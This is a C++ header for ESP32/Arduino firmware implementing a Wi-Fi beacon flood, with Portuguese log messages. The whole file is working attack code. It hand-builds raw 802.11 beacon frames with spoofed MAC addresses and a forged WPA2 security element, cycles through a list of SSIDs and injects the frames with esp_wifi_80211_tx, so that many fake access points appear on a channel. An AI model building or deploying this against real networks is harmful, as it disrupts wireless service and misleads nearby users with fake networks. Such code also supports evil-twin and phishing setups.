#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <vector>
#include "../utils/logger.h"
#include "../config.h"

class BeaconFlood {
public:
    static BeaconFlood& get() { static BeaconFlood inst; return inst; }

    bool running = false;
    std::vector<String> ssids;
    uint8_t channel = 1;

    void addSSID(const String& s) { ssids.push_back(s); }
    void clearSSIDs() { ssids.clear(); }

    void start(uint8_t ch = 1) {
        channel = ch;
        running = true;
        LOG.warn("Beacon Flood iniciado: " + String(ssids.size()) + " SSIDs ch" + String(ch));
    }

    void stop() { running = false; LOG.info("Beacon Flood parado"); }

    void tick() {
        if (!running || ssids.empty()) return;
        static uint8_t idx = 0;
        static unsigned long last = 0;
        if (millis() - last < BEACON_INTERVAL) return;
        last = millis();
        idx = (idx + 1) % ssids.size();
        sendBeacon(ssids[idx].c_str(), channel, idx);
    }

private:
    void sendBeacon(const char* ssid, uint8_t ch, uint8_t bssidByte) {
        uint8_t ssidLen = strlen(ssid);
        uint8_t frame[160] = {
            // Frame Control: beacon
            0x80, 0x00,
            0x00, 0x00,
            // DA: broadcast
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
            // SA / BSSID: fake MAC variando por idx
            0xDE,0xAD,0xBE,0xEF,0x00, bssidByte,
            0xDE,0xAD,0xBE,0xEF,0x00, bssidByte,
            // Sequence
            0x00,0x00,
            // Timestamp (8 bytes)
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
            // Beacon interval
            0x64,0x00,
            // Capability: ESS + Privacy (0x0411 = bit0 ESS, bit4 Privacy, bit10 short slot)
            0x11,0x04
        };
        uint8_t offset = 36;
        // SSID IE
        frame[offset++] = 0x00;
        frame[offset++] = ssidLen;
        memcpy(frame + offset, ssid, ssidLen);
        offset += ssidLen;
        // Supported rates IE
        frame[offset++] = 0x01; frame[offset++] = 0x08;
        frame[offset++] = 0x82; frame[offset++] = 0x84;
        frame[offset++] = 0x8B; frame[offset++] = 0x96;
        frame[offset++] = 0x24; frame[offset++] = 0x30;
        frame[offset++] = 0x48; frame[offset++] = 0x6C;
        // DS Parameter Set IE (channel)
        frame[offset++] = 0x03; frame[offset++] = 0x01; frame[offset++] = ch;
        // RSN IE — WPA2-PSK CCMP (faz o AP falso aparecer como WPA2)
        static const uint8_t rsn[] = {
            0x30, 0x14,             // tag=RSN, len=20
            0x01, 0x00,             // version=1
            0x00, 0x0F, 0xAC, 0x04,// group cipher: CCMP
            0x01, 0x00,             // 1 pairwise cipher
            0x00, 0x0F, 0xAC, 0x04,// pairwise: CCMP
            0x01, 0x00,             // 1 AKM
            0x00, 0x0F, 0xAC, 0x02,// AKM: PSK
            0x00, 0x00              // RSN capabilities
        };
        memcpy(frame + offset, rsn, sizeof(rsn)); offset += sizeof(rsn);

        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, offset, false);
    }
};
